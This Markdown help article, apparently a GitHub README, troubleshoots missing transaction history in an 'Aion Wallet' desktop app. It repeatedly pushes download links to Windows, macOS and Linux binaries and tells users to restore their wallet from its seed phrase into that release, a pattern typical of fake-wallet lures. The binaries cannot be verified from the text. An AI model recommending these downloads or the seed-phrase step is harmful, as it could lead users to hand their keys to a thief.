![Aion Wallet](assets/banner-article.png)

# Aion wallet transaction history, missing or unreadable

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Transaction history in Aion Wallet is fetched from a node rather than rebuilt from the chain by the application, so a history that is empty or incomplete usually reflects the connection or the account being viewed, not a change to your funds.

The balance and the history can disagree in both directions: a correct balance with no history, or an old history with a balance that has moved on. Neither state changes what is actually recorded on the chain.

## You'll see this if

- The wallet shows a balance but no transactions beneath it.
- A recent transfer is missing while older ones are listed.
- History appears and then empties after a restart.
- You restored a wallet and the list is shorter than you remember.

## Why history is separate from the balance

The balance is a single value read from the current state of the chain. History is a list assembled from blocks, and nodes differ in how much of it they keep and how quickly they will serve it.

That means a wallet can be perfectly correct about the balance while failing to list the transactions that produced it. It also means an explorer can show a fuller history than the wallet does without either being wrong.

## The checks, in order

1. Confirm the address on the receive screen is the one you expect. A second, empty account in the same wallet explains both an empty balance and an empty list.
2. Open the current release. History loading is one of the areas that changes between builds, and an older installation may be asking an endpoint for a format it no longer returns.
3. Wait for the connection to settle. A wallet that is still syncing shows what it has, which is often a partial list rather than nothing.
4. Restart the application completely so the request is rebuilt from scratch.
5. Compare with a block explorer. If the explorer shows the transaction, the chain has it and the wallet will catch up.
6. If the list stays empty while the balance is right, restore the wallet from its seed phrase into the current release and let it reload.

## What a missing transaction actually means

There are three possibilities and they are easy to tell apart.

The transaction has not been confirmed yet. Sending is not instant, and a pending transaction may not appear in the wallet's history until it is included in a block.

The transaction was confirmed but on a different account. Sending to an address you do not control, or to the wrong account in your own wallet, produces a history entry that belongs elsewhere. The [how to find your Aion address](https://github.com/aion-wallet/aion-wallet-help/blob/main/how-to-find-your-aion-address.md) guide is the check to run before sending again.

The wallet is not loading it. The chain, the explorer and the recipient all show the transfer; only your installation does not.

## History as a record

A wallet's list is a convenience, not a ledger. If you need a durable record for accounting or tax purposes, export it or record the transaction hashes as they happen, because a reinstall can empty the local view without touching the chain.

The same applies to a restaked or delegated position: the delegation shows in the staking view and in the transaction list separately, and the two can update at different times.

## If the history looks wrong rather than missing

An entry with an unexpected amount is usually a fee or a delegation rather than an error. Aion transactions carry a fee, and a delegation moves value within your own account while still producing a transaction.

An entry with an address you do not recognise is worth reading properly before assuming a compromise. Mining payouts, pool rewards and bridge operations all produce counterparties you may not have saved.

When the list and the balance disagree, the connection is the usual cause, and the [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) guide covers the endpoint side before anything local is changed.

## Prevention

Keep transaction hashes for anything that matters. A hash is independent of the application, survives a reinstall, and can be looked up on any explorer.

Update the wallet when a new release appears, rather than after the history stops loading.

Keep a separate note of the address you use for each purpose: mining payouts, staking rewards and spending. Comparing the right account is much faster than comparing the whole wallet.

## History and the staking view

A delegation is a transaction, so it appears in the list once, while the position it created appears in the staking view continuously. Reading one and expecting the other is the usual reason a holder thinks a delegation failed.

If the position is what you are trying to understand rather than the transfer that created it, start with the [how to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) guide, and read the [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) article for what the position earns afterwards.

## Frequently asked questions

### Does an empty history mean the wallet was wiped?

No. The keys are local and the history comes from a node. An empty list with a correct balance is a loading problem.

### Will history come back after a reinstall?

It is fetched again from the endpoint for the account you restore, so a reinstall with the same phrase usually restores the list as well as the balance.

### Can I delete history?

Not from the chain. You can clear it locally by removing the installation, but the transactions remain public at your address.

### Why is a pending transaction missing?

Most builds list a transaction once it is included in a block. Until then it exists in the mempool rather than in the history.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion wallet zero balance after login](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-zero-balance.md) - when the balance and the history are both empty.
- [Aion explorer down](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-explorer-down.md) - confirming a transfer without an explorer.
- [How to find your Aion address](https://github.com/aion-wallet/aion-wallet-help/blob/main/how-to-find-your-aion-address.md) - the check that comes before any send.
- [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) - the stall behind most partial lists.
